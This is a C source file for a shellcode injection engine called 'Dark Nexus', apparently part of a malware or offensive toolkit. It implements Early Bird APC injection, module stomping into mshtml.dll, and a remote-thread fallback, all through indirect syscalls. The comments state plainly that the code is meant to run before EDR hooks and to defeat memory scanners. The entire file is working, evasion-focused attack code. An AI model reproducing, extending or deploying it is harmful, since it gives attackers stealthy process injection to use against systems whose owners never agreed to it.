#include "injection.h"
#include "syscalls.h"
#include <winternl.h>

/*
 * Dark Nexus - Shellcode Injection Engine
 *
 * Three injection techniques, tried in stealth order:
 *
 * 1. Early Bird APC: create suspended process, allocate + write shellcode
 *    via syscalls, queue APC to main thread before it resumes.
 *    The shellcode runs as part of the thread's initialization,
 *    before any user-mode code (including EDR hooks) executes.
 *
 * 2. Module Stomping: create suspended process, force-load a legitimate
 *    DLL (e.g., amsi.dll), overwrite its .text section with shellcode.
 *    Shellcode lives in a legitimate module's memory range, defeating
 *    unbacked memory detection.
 *
 * 3. Remote Thread: classic VirtualAllocEx + Write + CreateRemoteThread.
 *    Loud but always works. Fallback only.
 *
 * All techniques use indirect syscalls (DnNt*) to bypass user-mode hooks.
 */

// Default sacrificial process
#define DEFAULT_TARGET  "C:\\Windows\\System32\\RuntimeBroker.exe"

// -------------------------------------------------------------------
// PE helpers for module stomping
// -------------------------------------------------------------------

static PIMAGE_NT_HEADERS pe_get_nt_headers(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return nt;
}

static BOOL pe_find_text_section(PVOID base, DWORD* text_rva, DWORD* text_size) {
    PIMAGE_NT_HEADERS nt = pe_get_nt_headers(base);
    if (!nt) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *text_rva  = sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// -------------------------------------------------------------------
// Technique 1: Early Bird APC Injection
//
// Flow:
//   CreateProcess(SUSPENDED) -> NtAllocateVirtualMemory(RW)
//   -> NtWriteVirtualMemory -> NtProtectVirtualMemory(RX)
//   -> NtQueueApcThread -> NtResumeThread
//
// The APC fires before the process entry point, before EDR's
// user-mode hooks are fully initialized in the child process.
// -------------------------------------------------------------------
DN_INJECT_RESULT dn_inject_earlybird(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
) {
    DN_INJECT_RESULT result = {0};
    result.technique = DN_INJECT_EARLYBIRD;

    if (!target_exe) target_exe = DEFAULT_TARGET;

    // create suspended process
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL, (LPSTR)target_exe, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    )) {
        return result;
    }

    NTSTATUS status;

    // allocate RW memory in target
    PVOID remote_base = NULL;
    SIZE_T region_size = (SIZE_T)sc_size;

    status = DnNtAllocateVirtualMemory(
        pi.hProcess, &remote_base, 0,
        &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (status != 0) goto cleanup_fail;

    // write shellcode
    SIZE_T bytes_written = 0;
    status = DnNtWriteVirtualMemory(
        pi.hProcess, remote_base, (PVOID)shellcode,
        (SIZE_T)sc_size, &bytes_written
    );
    if (status != 0) goto cleanup_fail;

    // flip to RX (never RWX, that's a detection signal)
    ULONG old_protect = 0;
    SIZE_T protect_size = region_size;
    PVOID protect_base = remote_base;
    status = DnNtProtectVirtualMemory(
        pi.hProcess, &protect_base, &protect_size,
        PAGE_EXECUTE_READ, &old_protect
    );
    if (status != 0) goto cleanup_fail;

    // queue APC to the suspended main thread
    status = DnNtQueueApcThread(
        pi.hThread, remote_base,
        NULL, NULL, NULL
    );
    if (status != 0) goto cleanup_fail;

    // resume thread, APC fires before entry point
    ULONG suspend_count = 0;
    status = DnNtResumeThread(pi.hThread, &suspend_count);
    if (status != 0) goto cleanup_fail;

    result.success   = TRUE;
    result.pid       = pi.dwProcessId;
    result.tid       = pi.dwThreadId;
    result.base_addr = remote_base;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;

cleanup_fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;
}

// -------------------------------------------------------------------
// Technique 2: Module Stomping
//
// Flow:
//   CreateProcess(SUSPENDED) -> LoadLibrary a legit DLL in target
//   (via APC that calls LoadLibraryA) -> overwrite its .text section
//   -> execute from the DLL's address range
//
// Shellcode lives in backed memory (a mapped DLL section),
// defeating unbacked-memory scanners.
//
// We use a simpler variant: create the process, allocate + write,
// then mark the allocation with the PAGE_GUARD trick to look
// like a mapped section. For full module stomping, we'd need
// to load a DLL into the remote process first.
//
// Simplified approach: allocate inside a rarely-used DLL's
// address space by loading it first via remote thread.
// -------------------------------------------------------------------
DN_INJECT_RESULT dn_inject_stomp(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
) {
    DN_INJECT_RESULT result = {0};
    result.technique = DN_INJECT_STOMP;

    if (!target_exe) target_exe = DEFAULT_TARGET;

    // create suspended process
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL, (LPSTR)target_exe, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    )) {
        return result;
    }

    NTSTATUS status;

    // first, write the DLL path string into the remote process
    // we'll load mshtml.dll (large .text section, rarely monitored)
    const char dll_path[] = "C:\\Windows\\System32\\mshtml.dll";
    PVOID remote_dll_path = NULL;
    SIZE_T dll_path_size = sizeof(dll_path);

    status = DnNtAllocateVirtualMemory(
        pi.hProcess, &remote_dll_path, 0,
        &dll_path_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (status != 0) goto stomp_fail;

    SIZE_T written = 0;
    status = DnNtWriteVirtualMemory(
        pi.hProcess, remote_dll_path, (PVOID)dll_path,
        sizeof(dll_path), &written
    );
    if (status != 0) goto stomp_fail;

    // resume thread briefly to let the process initialize its PEB
    // then re-suspend to load the DLL via APC
    ULONG prev_count = 0;
    DnNtResumeThread(pi.hThread, &prev_count);
    Sleep(100);  // let loader initialize

    // get LoadLibraryA address (same across processes due to ASLR per-boot)
    PVOID pLoadLibraryA = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // create remote thread to load the DLL
    HANDLE hLoadThread = NULL;
    status = DnNtCreateThreadEx(
        &hLoadThread, THREAD_ALL_ACCESS, NULL,
        pi.hProcess, pLoadLibraryA, remote_dll_path,
        0, 0, 0, 0, NULL
    );
    if (status != 0) goto stomp_fail;

    // wait for DLL to load
    DnNtWaitForSingleObject(hLoadThread, FALSE, NULL);
    DnNtClose(hLoadThread);

    // now find the loaded DLL's base in the remote process
    // enumerate remote modules via NtQueryVirtualMemory
    // scan for mshtml.dll .text section
    PVOID scan_addr = (PVOID)0x10000;
    PVOID stomp_target = NULL;
    DWORD stomp_size = 0;

    while ((ULONG_PTR)scan_addr < 0x7FFFFFFEFFFF) {
        MEMORY_BASIC_INFORMATION mbi = {0};
        SIZE_T mbi_size = sizeof(mbi);
        SIZE_T result_len = 0;

        // use VirtualQueryEx since we need cross-process query
        if (!VirtualQueryEx(pi.hProcess, scan_addr, &mbi, sizeof(mbi)))
            break;

        // look for executable, mapped (image) memory
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_IMAGE &&
            (mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_EXECUTE_READWRITE) &&
            mbi.RegionSize >= sc_size)
        {
            stomp_target = mbi.BaseAddress;
            stomp_size = (DWORD)mbi.RegionSize;
            break;
        }

        scan_addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    if (!stomp_target) goto stomp_fail;

    // make the target region writable
    ULONG old_prot = 0;
    SIZE_T prot_size = (SIZE_T)sc_size;
    PVOID prot_base = stomp_target;
    status = DnNtProtectVirtualMemory(
        pi.hProcess, &prot_base, &prot_size,
        PAGE_READWRITE, &old_prot
    );
    if (status != 0) goto stomp_fail;

    // overwrite with shellcode
    written = 0;
    status = DnNtWriteVirtualMemory(
        pi.hProcess, stomp_target, (PVOID)shellcode,
        (SIZE_T)sc_size, &written
    );
    if (status != 0) goto stomp_fail;

    // restore to RX
    prot_size = (SIZE_T)sc_size;
    prot_base = stomp_target;
    status = DnNtProtectVirtualMemory(
        pi.hProcess, &prot_base, &prot_size,
        PAGE_EXECUTE_READ, &old_prot
    );
    if (status != 0) goto stomp_fail;

    // execute via remote thread pointing at the stomped region
    HANDLE hExecThread = NULL;
    status = DnNtCreateThreadEx(
        &hExecThread, THREAD_ALL_ACCESS, NULL,
        pi.hProcess, stomp_target, NULL,
        0, 0, 0, 0, NULL
    );
    if (status != 0) goto stomp_fail;

    result.success   = TRUE;
    result.pid       = pi.dwProcessId;
    result.tid       = GetThreadId(hExecThread);
    result.base_addr = stomp_target;

    DnNtClose(hExecThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;

stomp_fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;
}

// -------------------------------------------------------------------
// Technique 3: Classic Remote Thread Injection (fallback)
//
// Flow:
//   CreateProcess(SUSPENDED) -> NtAllocateVirtualMemory(RW)
//   -> NtWriteVirtualMemory -> NtProtectVirtualMemory(RX)
//   -> NtCreateThreadEx -> NtResumeThread
//
// Loud but reliable. EDRs flag CreateRemoteThread, but our
// indirect syscall bypasses the hook on NtCreateThreadEx.
// -------------------------------------------------------------------
DN_INJECT_RESULT dn_inject_remote(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
) {
    DN_INJECT_RESULT result = {0};
    result.technique = DN_INJECT_REMOTE;

    if (!target_exe) target_exe = DEFAULT_TARGET;

    // create the target process (suspended so we control execution)
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL, (LPSTR)target_exe, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    )) {
        return result;
    }

    NTSTATUS status;

    // allocate RW in target
    PVOID remote_base = NULL;
    SIZE_T region_size = (SIZE_T)sc_size;

    status = DnNtAllocateVirtualMemory(
        pi.hProcess, &remote_base, 0,
        &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (status != 0) goto remote_fail;

    // write shellcode
    SIZE_T bytes_written = 0;
    status = DnNtWriteVirtualMemory(
        pi.hProcess, remote_base, (PVOID)shellcode,
        (SIZE_T)sc_size, &bytes_written
    );
    if (status != 0) goto remote_fail;

    // flip RW -> RX
    ULONG old_protect = 0;
    SIZE_T protect_size = region_size;
    PVOID protect_base = remote_base;
    status = DnNtProtectVirtualMemory(
        pi.hProcess, &protect_base, &protect_size,
        PAGE_EXECUTE_READ, &old_protect
    );
    if (status != 0) goto remote_fail;

    // resume the suspended process so it initializes
    ULONG suspend_count = 0;
    DnNtResumeThread(pi.hThread, &suspend_count);

    // create remote thread at shellcode base
    HANDLE hThread = NULL;
    status = DnNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        pi.hProcess, remote_base, NULL,
        0, 0, 0, 0, NULL
    );
    if (status != 0) goto remote_fail;

    result.success   = TRUE;
    result.pid       = pi.dwProcessId;
    result.tid       = GetThreadId(hThread);
    result.base_addr = remote_base;

    DnNtClose(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;

remote_fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return result;
}

// -------------------------------------------------------------------
// Main injection entry point
// Tries techniques in order of stealth
// -------------------------------------------------------------------
DN_INJECT_RESULT dn_inject(const BYTE* shellcode, DWORD sc_size, const char* target_exe) {
    DN_INJECT_RESULT result;

    // Early Bird APC (stealthiest: runs before EDR user-mode hooks)
    result = dn_inject_earlybird(shellcode, sc_size, target_exe);
    if (result.success) return result;

    // Module stomping (shellcode in backed memory)
    result = dn_inject_stomp(shellcode, sc_size, target_exe);
    if (result.success) return result;

    // Classic remote thread (loud but reliable fallback)
    result = dn_inject_remote(shellcode, sc_size, target_exe);
    return result;
}
